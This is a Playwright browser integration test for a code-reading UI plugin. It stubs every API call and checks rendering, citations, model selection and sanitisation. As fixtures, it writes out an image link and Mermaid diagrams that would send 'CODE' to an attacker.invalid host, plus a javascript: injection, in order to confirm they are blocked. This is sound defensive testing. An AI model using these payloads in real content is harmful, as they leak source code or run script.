import { chromium } from 'playwright';
import { build } from 'esbuild';
import { readFile, mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import assert from 'node:assert/strict';
import { verifyCodeReadability, sampleSource } from './browser-code-check.mjs';
import { verifyFileWorkspace } from './browser-workspace-check.mjs';
import { projectTrigger, verifyProjectSelect } from './browser-project-check.mjs';
import { assertModelDisabled, longModelGroups, modelPopup, modelTrigger, verifyModelSelect, waitForModel } from './browser-model-check.mjs';

// Isolated component integration test. All HTTP is intercepted: this does not
// impersonate or replace the authenticated DSH shell at the existing GUI URL.
const output = path.resolve(process.env.DSH_TEST_BROWSER_OUTPUT ?? '.test-output/browser'); await mkdir(output, { recursive: true });
const manifest = JSON.parse(await readFile('package.json', 'utf8'));
const bootstrap = await build({ stdin: { contents: `import React from 'react';import * as jsx from 'react/jsx-runtime';import * as ReactDOM from 'react-dom';import {createRoot} from 'react-dom/client';window.React=React;window.createRoot=createRoot;window.slots={};window.__ModuleLoader__={load(row){window.plugin=row.factory(id=>{if(id==='react')return React;if(id==='react/jsx-runtime')return jsx;if(id==='react-dom')return ReactDOM;throw Error('Unexpected external '+id);});}};`, resolveDir: process.cwd(), loader: 'js' }, bundle: true, write: false, format: 'iife', platform: 'browser' });
const plugin = await readFile(process.env.DSH_TEST_CLIENT_BUNDLE ?? 'lib/client.js', 'utf8');
const projectId = 'project-11111111-1111-4111-8111-111111111111';
const sessionA = 'reading-11111111-1111-4111-8111-111111111111'; const sessionB = 'reading-22222222-2222-4222-8222-222222222222';
const repoA = 'repo-11111111-1111-4111-8111-111111111111'; const repoB = 'repo-22222222-2222-4222-8222-222222222222';
const evidenceId = 'evidence-11111111-1111-4111-8111-111111111111'; const lessonId = 'lesson-11111111-1111-4111-8111-111111111111';
const repositories = [{ id: repoA, name: '订单仓库', root: 'D:\\fixtures\\orders' }, { id: repoB, name: '支付仓库', root: 'D:\\fixtures\\payments' }];
const project = { id: projectId, title: '订单与支付 · 组件测试', bindingRevision: 1, repositories, sessions: [{ id: sessionA, stage: 'call-chain', topic: '订单调用链', revision: 1, createdAt: '2026-01-01T00:00:00Z' }, { id: sessionB, stage: 'business', topic: '支付业务', revision: 1, createdAt: '2026-01-02T00:00:00Z' }] };
const evidence = { id: evidenceId, repoId: repoA, path: 'entry.ts', startLine: 41, endLine: 40 + sampleSource.split('\n').length, hash: '1'.repeat(64), symbol: 'submit', readAt: '2026-01-01T00:00:00Z' };
const lesson = { id: lessonId, title: '从下单到支付', stage: 'call-chain', topic: '订单提交', revision: 1, createdAt: '2026-01-01T00:00:00Z', markdown: `订单服务调用支付服务。\n\n[订单入口](evidence://${evidenceId})\n\n![不能外发](https://attacker.invalid/pixel?data=CODE)`, conclusion: '跨仓调用需要调用端与被调用端证据。', claims: [{ kind: 'fact', text: '入口调用提交方法。', evidenceIds: [evidenceId] }], nextQuestions: ['支付失败如何恢复？'], topics: [], mermaid: 'sequenceDiagram\n participant U as 用户\n participant O as 订单仓库\n participant P as 支付仓库\n U->>O: 下单\n O->>P: 请求支付\n P-->>O: 返回结果' };
lesson.markdown += '\n\n```typescript\n' + sampleSource.split('\n').slice(0, -1).join('\n') + '\n```';
lesson.claims.push({ kind: 'inference', text: '支付结果可能影响订单状态，需要继续追踪调用方。', evidenceIds: [evidenceId] }, { kind: 'hypothesis', text: '是否有失败重试仍待后续源码核验。', evidenceIds: [] });
lesson.markdown += '\n\n[未归档引用](evidence://evidence-99999999-9999-4999-8999-999999999999)';
const previousLesson = { ...lesson, id: 'lesson-22222222-2222-4222-8222-222222222222', title: '先理解金额校验', markdown: 'PREVIOUS_LESSON_ONLY：先校验金额，再发送支付请求。', conclusion: '金额必须是有效的最小货币单位。', nextQuestions: [], mermaid: undefined };
const pickerProjects = [];
const pickerSession = 'reading-33333333-3333-4333-8333-333333333333';
const pickerTools = { id: 'project-33333333-3333-4333-8333-333333333333', title: '工具小程序', bindingRevision: 1, repositories: [{ id: 'repo-33333333-3333-4333-8333-333333333333', name: '工具小程序', root: 'D:\\fixtures\\tools' }], sessions: [{ id: pickerSession, stage: 'discover', topic: '工具小程序阅读', revision: 1, createdAt: '2026-01-03T00:00:00Z' }] };
const pickerEmpty = { ...pickerTools, id: 'project-44444444-4444-4444-8444-444444444444', title: '尚无阅读会话的仓库（验证仓库名称很长时的换行与浮层边界）', sessions: [] };
const snapshotHolds = new Map(); const snapshotSeen = new Map();
const states = new Map([[sessionA, { stage: 'call-chain', topic: '订单调用链', revision: 1, modelSelection: { provider: 'remote', model: 'cloud-reader' } }], [sessionB, { stage: 'business', topic: '支付业务', revision: 1, modelSelection: { provider: 'local', model: 'private-reader' } }]]);
const requests = []; const external = []; const errors = [];
const deferred = () => { let resolve; const promise = new Promise(value => { resolve = value; }); return { promise, resolve }; };
// No fixture has access to an actual model, user repository, or HTTP server.
// A request can be held after capture to exercise UI epoch guards even when a
// carrier ignores AbortSignal; state remains strictly scoped by session id.
const turns = new Map(); const readerStates = new Map();
const readerStateFor = id => {
  if (!readerStates.has(id)) readerStates.set(id, { version: 1, revision: 0, viewStage: null, selectedLessonId: null, viewedLessonIds: [], understoodLessonIds: [], readerPosition: null, lessonScrollTop: 0 });
  return readerStates.get(id);
};
const fixtureSource = Array.from({ length: 40 }, (_, index) => `// 证据前只读上下文 ${index + 1}`).join('\n') + '\n' + sampleSource;
const sourceRows = fixtureSource.split('\n'); let sourceHash = evidence.hash;
const acceptedPrompts = new Map();
let promptMode = 'complete'; let promptHold = null; let promptSeen = null; let promptSerial = 0; let cancelKeepsRunning = false;
const turnFor = id => turns.get(id) ?? { messages: [], running: false, turnEnd: null };
let statusMode = 'healthy'; let listMode = 'healthy'; let modelsMode = 'healthy'; let snapshotFails = false; let sessionCreateFails = false; let listHold = null; let listSeen = null; let createdSessions = 0;
const freshProjects = []; let modelsHold = null; let modelsSeen = null; let paginationMode = false; let paginationHold = null; let paginationSeen = null;
let selectModelHold = null; let selectModelSeen = null;
const modelGroups = [{ id: 'local', name: '本地', models: [{ id: 'private-reader', name: 'Private Reader' }] }, { id: 'remote', name: '远程', models: [{ id: 'cloud-reader', name: 'Cloud Reader' }] }];
const status = { package: manifest.name, version: manifest.version, apiVersion: 1, targetDshVersion: manifest.engines.dsh, enabled: true, dataDirectory: 'C:\\test-user\\.dsh\\code-reading', dataSource: 'default' };
let activePage = null;
const browser = await chromium.launch({ executablePath: process.env.DSH_TEST_BROWSER ?? 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', headless: true });
try {
  const page = await browser.newPage({ viewport: { width: 1380, height: 1050 }, locale: 'zh-CN' }); activePage = page; page.on('pageerror', e => errors.push(e.message));
  page.on('request', request => { if (!request.url().startsWith('http://127.0.0.1:19387') && /^https?:/.test(request.url())) external.push(request.url()); });
  await page.route('**/*', async route => {
    const request = route.request();
    if (request.url() === 'http://127.0.0.1:19387/reading-component-test') return route.fulfill({ contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><style>html,body,#root{height:100%;margin:0;font-family:"Microsoft YaHei",system-ui}</style><div id="root"></div>' });
    if (!request.url().endsWith('/api/code-reading')) return route.abort();
    const body = request.postDataJSON(); requests.push(body); const p = body.params; let value;
    switch (body.method) {
      case 'status': {
        if (statusMode === 'missing') return route.fulfill({ status: 404, contentType: 'text/html', body: '<html>PRIVATE_SENTINEL Host not loaded</html>' });
        value = { ...status, ...(statusMode === 'old-version' ? { version: '0.1.1' } : {}) }; break;
      }
      case 'list': {
        if (listHold) { const hold = listHold; listHold = null; listSeen?.resolve(); await hold.promise; }
        if (listMode === 'failure') return route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'LIST_FAILED', message: '夹具列表暂不可用' } }) });
        value = { projects: listMode === 'empty' ? [] : listMode === 'fresh' ? freshProjects : [project, ...pickerProjects], root: status.dataDirectory, diagnostics: [] }; break;
      }
      case 'models': {
        if (modelsHold) { const hold = modelsHold; modelsHold = null; modelsSeen?.resolve(); await hold.promise; }
        if (modelsMode === 'failure') return route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'MODELS_FAILED', message: '夹具模型目录暂不可用' } }) });
        value = { default: modelsMode === 'empty' || listMode === 'fresh' ? null : { provider: 'local', model: 'private-reader' }, groups: modelsMode === 'empty' ? [] : modelsMode === 'long' ? longModelGroups : modelGroups, failures: [] }; break;
      }
      case 'create-project': {
        assert.equal(listMode, 'fresh'); const serial = String(freshProjects.length + 1).padStart(8, '0');
        value = { id: `project-${serial}-3333-4333-8333-333333333333`, title: p.title || path.win32.basename(p.repositories[0].path), bindingRevision: 1, repositories: p.repositories.map((repo, index) => ({ id: `repo-${serial}-3333-4333-8333-${String(index + 1).padStart(12, '0')}`, name: repo.name || path.win32.basename(repo.path), root: repo.path })), sessions: [] }; freshProjects.push(value); break;
      }
      case 'create-session': {
        if (sessionCreateFails) return route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'SESSION_CREATE_FAILED', message: '夹具会话创建失败' } }) });
        const owner = freshProjects.find(row => row.id === p.projectId); assert.ok(owner); const id = `reading-${String(++createdSessions).padStart(8, '0')}-3333-4333-8333-333333333333`;
        const state = { stage: 'discover', topic: '', revision: 1, modelSelection: null }; states.set(id, state); owner.sessions.push({ id, ...state, createdAt: '2026-01-03T00:00:00Z' }); value = { sessionId: id }; break;
      }
      case 'snapshot': {
        if (snapshotFails) return route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'SNAPSHOT_FAILED', message: '夹具档案暂不可用' } }) });
        const state = states.get(p.sessionId); assert.ok(state, 'known fixture session'); const owner = [project, ...pickerProjects, ...freshProjects].find(row => row.sessions.some(session => session.id === p.sessionId)); assert.ok(owner);
        const turn = turnFor(p.sessionId);
        value = { sessionId: p.sessionId, project: owner, ...state, state: { id: p.sessionId, projectId: owner.id, ...state, evidence: owner === project ? [evidence] : [], lessons: p.sessionId === sessionA ? [previousLesson, lesson] : [], readerState: readerStateFor(p.sessionId), messageRefs: [], stageHistory: [] }, outputDirectory: `${status.dataDirectory}\\projects\\${owner.id}\\sessions\\${p.sessionId}`, messages: turn.messages, running: turn.running, turnEnd: turn.turnEnd, hasMoreMessages: false, archiveError: null };
        if (paginationMode) {
          if (p.beforeSeq !== undefined) { paginationSeen?.resolve(); await paginationHold.promise; value.messages = [{ seq: 99, role: 'assistant', text: 'HISTORY_ONLY_A', time: '2026-01-01T00:00:00Z' }]; }
          else { value.messages = [{ seq: 100, role: 'user', text: p.sessionId === sessionA ? 'CURRENT_ONLY_A' : 'CURRENT_ONLY_B', time: '2026-01-01T00:00:00Z' }]; value.hasMoreMessages = p.sessionId === sessionA; }
        }
        if (snapshotHolds.has(p.sessionId)) { const hold = snapshotHolds.get(p.sessionId); snapshotHolds.delete(p.sessionId); snapshotSeen.get(p.sessionId)?.resolve(); await hold.promise; }
        break;
      }
      case 'reader-state': {
        const current = readerStateFor(p.sessionId); assert.equal(p.expectedRevision, current.revision, 'independent reader-state revision');
        const allowed = new Set(['activeDocument', 'viewStage', 'selectedLessonId', 'viewedLessonIds', 'understoodLessonIds', 'readerPosition', 'lessonScrollTop']); if (Object.hasOwn(p.patch, 'activeDocument')) assert.ok([null, 'source', 'reading'].includes(p.patch.activeDocument), 'activeDocument is only a metadata enum, never source content');
        for (const key of Object.keys(p.patch)) assert.ok(allowed.has(key), `reader-state whitelist: ${key}`);
        if (p.patch.readerPosition) { const allowedPosition = new Set(['repoId', 'path', 'hash', 'offset', 'scrollTop', 'scrollLeft']); for (const key of Object.keys(p.patch.readerPosition)) assert.ok(allowedPosition.has(key), `source or local UI state must not be persisted: ${key}`); }
        const changed = Object.entries(p.patch).some(([key, value]) => JSON.stringify(current[key]) !== JSON.stringify(value));
        Object.assign(current, p.patch); if (changed) current.revision++; value = current; break;
      }
      case 'stage': { const state = states.get(p.sessionId); assert.equal(p.expectedRevision, state.revision); Object.assign(state, { stage: p.stage, topic: p.topic, revision: state.revision + 1 }); value = state; break; }
      case 'tree': value = { repoId: p.repoId, directory: p.directory ?? '', entries: [{ name: 'entry.ts', path: 'entry.ts', kind: 'file' }], nextOffset: null, truncated: false, budgetTruncated: false, visited: 1 }; break;
      case 'annotations': value = { revision: 0, items: [] }; break;
      case 'files': value = { repoId: p.repoId, paths: ['entry.ts'], truncated: false }; break;
      case 'search': value = { repoId: p.repoId, matches: [{ repoId: p.repoId, path: 'entry.ts', line: 41, text: '只读fixture的订单入口' }], truncated: false }; break;
      case 'read': value = { evidence: { ...evidence, repoId: p.repoId }, lines: sampleSource.split('\n').map((text, index) => ({ number: 41 + index, text })) }; break;
      case 'view-file': {
        const offset = p.offset ?? 1; const limit = p.limit ?? 200;
        value = { repoId: p.repoId, path: p.path, hash: sourceHash, bytes: Buffer.byteLength(fixtureSource), totalLines: sourceRows.length, offset, lines: sourceRows.slice(offset - 1, offset - 1 + limit).map((text, index) => ({ number: offset + index, text })) }; break;
      }
      case 'evidence': {
        if (p.evidenceId !== evidenceId) return route.fulfill({ status: 404, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'EVIDENCE_NOT_FOUND', message: '该引用未归档，不能根据路径猜测源码' } }) });
        value = { evidence, stale: false, lines: sampleSource.split('\n').map((text, index) => ({ number: 41 + index, text })) }; break;
      }
      case 'prompt': {
        if (acceptedPrompts.has(p.requestId)) { value = { accepted: true, replayed: true, running: turnFor(p.sessionId).running }; break; }
        assert.ok(states.has(p.sessionId), 'prompt must identify a fixture session');
        assert.deepEqual(p.expectedModel, states.get(p.sessionId).modelSelection, 'prompt must preserve the admitted fixture model');
        assert.ok(['question', 'code'].includes(p.readingMode), 'every prompt explicitly identifies question/code reading mode');
        if (p.readingMode === 'code') assert.ok(p.selection, 'code-mode admission must include the existing canonical selection payload');
        const serial = ++promptSerial; const turn = { messages: [{ seq: serial * 10, role: 'user', text: p.text, time: '2026-01-04T00:00:00Z' }], running: true, turnEnd: null }; turns.set(p.sessionId, turn);
        if (promptHold) { const hold = promptHold; promptHold = null; promptSeen?.resolve(); await hold.promise; }
        if (promptMode === 'failure') { turns.set(p.sessionId, { ...turn, running: false }); return route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ ok: false, error: { code: 'FIXTURE_PROMPT_FAILED', message: '隔离夹具保留错误与原知识点' } }) }); }
        if (promptMode === 'network-error') { acceptedPrompts.set(p.requestId, structuredClone(p)); turn.running = false; turn.turnEnd = { seq: serial * 10 + 2, reason: { kind: 'completed' } }; return route.abort('failed'); }
        if (promptMode === 'complete') { turn.messages.push({ seq: serial * 10 + 1, role: 'assistant', text: `FIXTURE_REPLY_${serial}：仅隔离模拟，没有调用真实模型。`, time: '2026-01-04T00:00:01Z' }); turn.running = false; turn.turnEnd = { seq: serial * 10 + 2, reason: { kind: 'completed' } }; }
        value = { accepted: true, running: turn.running }; break;
      }
      case 'cancel': {
        const turn = turnFor(p.sessionId); if (!cancelKeepsRunning) turns.set(p.sessionId, { ...turn, running: false, turnEnd: { seq: ++promptSerial * 10 + 3, reason: { kind: 'cancelled' } } }); value = { accepted: true }; break;
      }
      case 'export': value = { path: `${status.dataDirectory}\\projects\\${projectId}\\sessions\\${p.sessionId}\\exports\\reading.md` }; break;
      case 'select-model': {
        if (selectModelHold) { const hold = selectModelHold; selectModelHold = null; selectModelSeen?.resolve(); await hold.promise; }
        states.get(p.sessionId).modelSelection = { provider: p.provider, model: p.model }; value = { selected: states.get(p.sessionId).modelSelection }; break;
      }
      default: value = {};
    }
    return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ ok: true, value }) });
  });
  await page.goto('http://127.0.0.1:19387/reading-component-test'); await page.addScriptTag({ content: bootstrap.outputFiles[0].text }); await page.addScriptTag({ content: plugin });
  await page.evaluate(() => {
    window.effectDisposers = [];
    const own = dispose => { if (typeof dispose === 'function') window.effectDisposers.push(dispose); return dispose; };
    const ctx = { effect: fn => own(fn()), uiWorkspace: { pickDirectory: async () => { window.directoryPickCalls = (window.directoryPickCalls ?? 0) + 1; return window.directoryPickResult ?? null; } }, slots: { inject: (_name, callback) => own(callback()), register: (options, component) => { const key = `${options.name}:${options.id ?? options.key}`; const row = { options, component }; window.slots[key] = row; return () => { if (window.slots[key] === row) delete window.slots[key]; }; } } };
    window.plugin.apply(ctx); window.testWorkspaces = []; window.selectedWorkspaceId = 'ordinary-initial'; window.readingRoot = window.createRoot(document.getElementById('root'));
    window.renderReadingPanel = () => { const slot = window.slots['main:code-reading']; window.readingRoot.render(window.React.createElement(slot.component, { ...slot.options.inject(), useWorkspaces: select => select({ items: window.testWorkspaces, selectedWorkspaceId: window.selectedWorkspaceId }) })); }; window.renderReadingPanel();
  });
  const menu = async name => { await page.getByRole('button', { name: '阅读菜单', exact: true }).click(); await page.locator('#cr-project-actions').getByRole('button', { name, exact: true }).click(); };
  const refreshPanel = async () => { const response = page.waitForResponse(response => response.url().endsWith('/api/code-reading') && response.request().postDataJSON()?.method === 'snapshot'); await menu('刷新'); await response; await page.waitForFunction(() => document.querySelector('[role="combobox"][aria-label="阅读项目切换"]')?.disabled === false); };
  const openRoute = async () => { const expand = page.getByRole('button', { name: '展开列表', exact: true }); if (await expand.isVisible()) await expand.click(); };
  const openHistory = async () => { await openRoute(); await page.locator('aside[aria-label="阅读列表"] .cr-history').waitFor(); };
  const selectSession = async topic => { await openHistory(); await page.locator('.cr-project .cr-session').filter({ hasText: topic }).click(); await page.getByRole('heading', { name: topic, level: 1, exact: true }).waitFor(); };
  const selectLesson = async title => { await openRoute(); await page.locator('.cr-route-list .cr-route-node').filter({ hasText: title }).click(); await page.getByRole('heading', { name: title, exact: true }).waitFor(); };
  const openCitation = async name => { await selectLesson(lesson.title); await page.getByRole('button', { name, exact: true }).click(); };
  const assertNoStageNavigation = async () => {
    assert.equal(await page.locator('.cr-stages, .cr-stage-index, .cr-route-stage, .cr-route-stage-button, .cr-welcome-route').count(), 0, 'no five-stage navigation or empty stage scaffolding');
    assert.equal(await page.getByRole('navigation', { name: '阅读阶段', exact: true }).count(), 0);
    assert.equal(await page.locator('.cr-route-list [aria-current="step"]').count(), 0);
  };
  const closeDialog = async title => page.getByRole('dialog', { name: title, exact: true }).getByRole('button', { name: `关闭${title}`, exact: true }).click();
  const showFiles = async () => { const expand = page.getByRole('button', { name: '展开文件目录', exact: true }); if (await expand.isVisible()) await expand.click(); await page.getByRole('navigation', { name: '源码工作台内容', exact: true }).getByRole('button', { name: '文件目录', exact: true }).click(); };
  const showSource = async () => { if (!await page.locator('main .cr-file-viewer').isVisible()) await page.getByRole('navigation', { name: '打开的文档', exact: true }).locator('.cr-document-tab-button[data-document-kind="source"]').last().click(); };
  const openMessages = async () => { const details = page.locator('.cr-inline-transcript'); if (await details.getAttribute('open') === null) await details.locator('summary').first().click(); await details.getByRole('button', { name: '对话记录', exact: true }).click(); };
  const openComposer = async () => { const toggle = page.locator('.cr-composer-toggle'); if (await toggle.isVisible() && await toggle.getAttribute('aria-expanded') === 'false') await toggle.click(); await page.getByLabel('追问当前知识点', { exact: true }).waitFor(); };
  const sendFixtureQuestion = async (text, requireConsent = false) => {
    await openComposer(); await page.getByLabel('追问当前知识点', { exact: true }).fill(text); const before = requests.filter(row => row.method === 'prompt').length; await page.getByRole('button', { name: '发送问题', exact: true }).click();
    if (requireConsent) { const dialog = page.getByRole('dialog', { name: '确认源码发送范围', exact: true }); await dialog.waitFor(); assert.equal(requests.filter(row => row.method === 'prompt').length, before, 'no model admission before source-range consent'); await dialog.getByText(/实际数据接收方/).waitFor(); await dialog.getByRole('button', { name: '确认并开始阅读', exact: true }).click(); }
  };
  console.log('[browser] Mounted intercepted Client fixture; checking reading list and read-only rendering.');
  await page.locator('.cr-welcome h1').waitFor(); assert.equal(await page.locator('.cr-welcome h1').innerText(), '从一个问题，\n或一段代码开始'); await assertNoStageNavigation();
  await page.setViewportSize({ width: 1220, height: 968 }); await page.screenshot({ path: path.join(output, 'reading-welcome-1220.png'), fullPage: true, animations: 'disabled' }); await page.setViewportSize({ width: 1380, height: 1050 });
  await page.locator('.cr-route-toolbar').getByText('阅读列表', { exact: true }).waitFor();
  const globalNewReading = page.locator('aside[aria-label="阅读列表"] .cr-new-reading'); await globalNewReading.waitFor(); assert.equal(await globalNewReading.isDisabled(), false);
  await page.getByRole('button', { name: '收起列表', exact: true }).click(); await page.getByRole('button', { name: '展开列表', exact: true }).waitFor(); await openRoute();
  assert.equal(await page.evaluate(() => window.slots['sidebar.panellist:code-reading'].options.label), '阅读代码');
  assert.equal(await page.locator('.cr-project .cr-session').count(), project.sessions.length, '.cr-session identifies real reading sessions, not placeholder or creation buttons');
  await projectTrigger(page).getByText('选择仓库', { exact: true }).waitFor();
  await selectSession('订单调用链'); await page.getByRole('heading', { name: '从下单到支付' }).waitFor();
  const projectSelect = await verifyProjectSelect({ page, output, requests, refresh: refreshPanel, primary: project, tools: pickerTools, empty: pickerEmpty,
    install: () => { pickerProjects.push(pickerTools, pickerEmpty); states.set(pickerSession, { stage: 'discover', topic: '工具小程序阅读', revision: 1, modelSelection: null }); },
    reset: () => { pickerProjects.length = 0; },
  });
  await page.getByRole('heading', { name: '从下单到支付', exact: true }).waitFor();
  await showFiles(); assert.equal(await page.getByRole('button', { name: '收起文件目录', exact: true }).getAttribute('aria-expanded'), 'true', 'the left directory is independently expandable on desktop'); assert.equal(await page.locator('aside .cr-file-viewer').count(), 0, 'source content never occupies a side rail');
  await waitForModel(page, '远程', 'Cloud Reader');
  await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 });
  assert.ok((await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('body').innerText()).includes('订单仓库'));
  await page.getByText('[图片未自动加载：不能外发]').waitFor(); assert.equal(external.length, 0);
  await selectSession('支付业务'); await waitForModel(page, '本地', 'Private Reader');
  await selectSession('订单调用链'); await waitForModel(page, '远程', 'Cloud Reader');
  const modelSelect = await verifyModelSelect({
    page, output, requests, sessionId: sessionA, refresh: refreshPanel,
    setCatalogMode: mode => { modelsMode = mode; },
    setCurrentModel: selected => { states.get(sessionA).modelSelection = selected; },
    holdSelection: () => { const hold = deferred(); const seen = deferred(); selectModelHold = hold; selectModelSeen = seen; return { seen: seen.promise, release: () => hold.resolve() }; },
  });
  await openCitation('订单入口'); const source = page.getByLabel('文件阅读器', { exact: true }); await source.locator('[data-evidence-line="true"]').first().waitFor();
  assert.equal(requests.filter(r => r.method === 'view-file').at(-1).params.repoId, repoA, 'citation opens its archived repository identity');
  assert.deepEqual(await source.locator('[data-evidence-line="true"]').evaluateAll(rows => rows.map(row => Number(row.dataset.codeLine))), Array.from({ length: sampleSource.split('\n').length }, (_, index) => index + 41));
  const codeReadability = await verifyCodeReadability({ page, output, sourceText: sourceRows.slice(35).join('\n'), startLine: 36, refresh: refreshPanel });
  await showFiles(); await page.getByLabel('检索内容或路径', { exact: true }).fill('entry'); await page.getByRole('button', { name: '按路径查找', exact: true }).click(); await page.locator('.cr-file-search-results .cr-evidence').waitFor(); await page.getByLabel('文件目录仓库', { exact: true }).selectOption(repoB); await page.waitForFunction(() => !document.querySelector('.cr-file-search-results')); await page.getByRole('button', { name: '搜索内容', exact: true }).click(); await page.locator('.cr-file-search-results .cr-evidence').click(); await source.locator('[data-code-line="41"]').waitFor(); assert.equal(requests.filter(row => row.method === 'view-file').at(-1).params.repoId, repoB, 'search results use the originating repository'); await openCitation('订单入口'); await source.locator('[data-evidence-line="true"]').first().waitFor(); assert.equal(requests.filter(row => row.method === 'view-file').at(-1).params.repoId, repoA, 'citation repository identity overrides a different browser repository');
  sourceHash = '2'.repeat(64); await openCitation('订单入口'); await page.locator('.cr-file-viewer[data-source-status="stale"]').waitFor(); assert.equal(await source.locator('[data-evidence-line="true"]').count(), 0, 'changed source hash cannot retain current-evidence line highlighting'); sourceHash = evidence.hash; await openCitation('订单入口'); await source.locator('[data-evidence-line="true"]').first().waitFor();
  const beforeUnknown = requests.filter(row => row.method === 'view-file').length; await openCitation('未归档引用'); await page.getByRole('alert').filter({ hasText: '引用无法定位' }).waitFor(); assert.equal(requests.filter(row => row.method === 'view-file').length, beforeUnknown, 'unknown reference cannot guess a similarly named source file');
  const beforeStage = requests.filter(row => ['stage', 'prompt'].includes(row.method)).length;
  await assertNoStageNavigation();
  assert.equal(await page.locator('.cr-section-tabs').count(), 0, 'legacy lessons without real sections cannot invent dimension controls');
  assert.deepEqual((await page.locator('.cr-route-list .cr-route-node-title').allTextContents()).sort(), [previousLesson.title, lesson.title].sort(), 'the reading list is flat and contains actual lessons only');
  lesson.sections = [{ dimension: 'business', markdown: 'SECTION_BUSINESS_ONLY：先核对金额，再请求支付。' }, { dimension: 'call-chain', markdown: lesson.markdown }];
  await refreshPanel();
  const dimensions = page.getByRole('navigation', { name: '内容维度', exact: true }); await dimensions.waitFor();
  assert.equal(await dimensions.getByRole('button').count(), 2, 'only actual published sections become dimension switches');
  await dimensions.getByRole('button', { name: '业务解释', exact: true }).click();
  await page.locator('main .cr-lesson').getByText('SECTION_BUSINESS_ONLY：先核对金额，再请求支付。', { exact: true }).waitFor();
  assert.equal(await dimensions.getByRole('button', { name: '业务解释', exact: true }).getAttribute('aria-pressed'), 'true');
  await dimensions.getByRole('button', { name: '调用链', exact: true }).click(); await page.getByRole('button', { name: '订单入口', exact: true }).waitFor();
  assert.equal(await page.locator('main .cr-lesson').getByText(/SECTION_BUSINESS_ONLY/).count(), 0, 'switching sections renders only the selected section');
  assert.equal(requests.filter(row => ['stage', 'prompt'].includes(row.method)).length, beforeStage, 'dimension and lesson navigation cannot mutate backend stage or call a model');
  await selectLesson(lesson.title); assert.equal(await page.locator('main .cr-lesson').count(), 1, 'only the selected knowledge point is rendered');
  delete lesson.sections; await refreshPanel(); await dimensions.waitFor({ state: 'detached' }); assert.equal(await dimensions.count(), 0, 'controls disappear again when the current lesson has no sections');
  const malicious = ['flowchart TD\nA@{ img: "//attacker.invalid/leak?data=CODE", label: "x" }', 'flowchart TD\nclick A "javascript:alert(1)"', 'flowchart TD\nA[<img src="//attacker.invalid/x">]'];
  const rejected = await page.evaluate(async samples => { const results = []; for (const source of samples) { try { await window.plugin.renderDiagramDocument(source); results.push(false); } catch { results.push(true); } } return results; }, malicious);
  assert.deepEqual(rejected, [true, true, true]); assert.equal(external.length, 0); assert.deepEqual(errors, []);
  const otherTypes = ['flowchart TD\n A[下单] --> B[支付]', 'classDiagram\n class Order {\n +submit()\n }', 'stateDiagram-v2\n [*] --> Pending\n Pending --> Done\n Done --> [*]', 'erDiagram\n ORDER ||--o{ ITEM : contains'];
  const rendered = await page.evaluate(async samples => { const results = []; for (const source of samples) { const html = await window.plugin.renderDiagramDocument(source); const document = new DOMParser().parseFromString(html, 'text/html'); results.push({ svg: !!document.querySelector('svg'), text: [...document.querySelectorAll('svg text')].map(node => node.textContent).join(' ').replace(/\s+/g, ''), forbidden: document.querySelectorAll('script,image,foreignObject,a').length }); } return results; }, otherTypes);
  assert.deepEqual(rendered.map(result => result.svg), [true, true, true, true]); assert.deepEqual(rendered.map(result => result.forbidden), [0, 0, 0, 0]);
  for (const [index, labels] of [['下单', '支付'], ['Order', 'submit()'], ['Pending', 'Done'], ['ORDER', 'ITEM', 'contains']].entries()) for (const label of labels) assert.ok(rendered[index].text.includes(label), `sanitized diagram ${index} must retain native SVG text label ${label}, not blank node shapes: ${JSON.stringify(rendered[index])}`);
  assert.equal(await page.locator('main .cr-lesson').count(), 1);
  const goodDiagram = lesson.mermaid; lesson.mermaid = 'flowchart TD\n A -->'; await refreshPanel(); await page.getByRole('alert').filter({ hasText: 'Mermaid 无法渲染' }).waitFor(); assert.ok((await page.locator('.cr-diagram pre').innerText()).includes('A -->'));
  lesson.mermaid = goodDiagram; await refreshPanel(); await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 });
  await page.evaluate(() => { window.testWorkspaces = [{ workspaceId: 'unrelated-workspace', title: '另一个普通工作区', path: 'D:\\unrelated-workspace' }]; window.selectedWorkspaceId = 'unrelated-workspace'; window.readingRoot.unmount(); window.readingRoot = window.createRoot(document.getElementById('root')); window.renderReadingPanel(); });
  await selectSession('订单调用链'); await page.getByRole('heading', { name: '从下单到支付', exact: true }).waitFor(); await waitForModel(page, '远程', 'Cloud Reader');
  await showFiles(); assert.deepEqual(await page.getByLabel('文件目录仓库').locator('option').evaluateAll(options => options.map(option => option.value)), [repoA, repoB]); assert.equal(requests.filter(request => request.method === 'snapshot').at(-1).params.sessionId, sessionA);
  await selectLesson(lesson.title); await page.getByRole('button', { name: '标记已理解', exact: true }).click(); await page.getByRole('button', { name: /已理解，撤销标记/ }).waitFor(); await openCitation('订单入口'); await source.locator('[data-code-line="41"]').waitFor(); await page.getByRole('button', { name: '保存阅读位置', exact: true }).click(); await page.getByRole('status').filter({ hasText: '阅读位置已保存' }).waitFor();
  assert.ok(readerStateFor(sessionA).understoodLessonIds.includes(lessonId)); assert.equal(readerStateFor(sessionB).understoodLessonIds.includes(lessonId), false); assert.equal(states.get(sessionA).revision, 1, 'reading state must not change stage revision'); assert.equal(readerStateFor(sessionA).readerPosition.path, 'entry.ts');
  await page.evaluate(() => { window.readingRoot.unmount(); window.readingRoot = window.createRoot(document.getElementById('root')); window.renderReadingPanel(); }); await source.locator('[data-code-line="41"]').waitFor(); assert.equal(await source.getAttribute('data-file-path'), 'entry.ts'); await selectLesson(lesson.title); await page.getByRole('button', { name: /已理解，撤销标记/ }).waitFor();
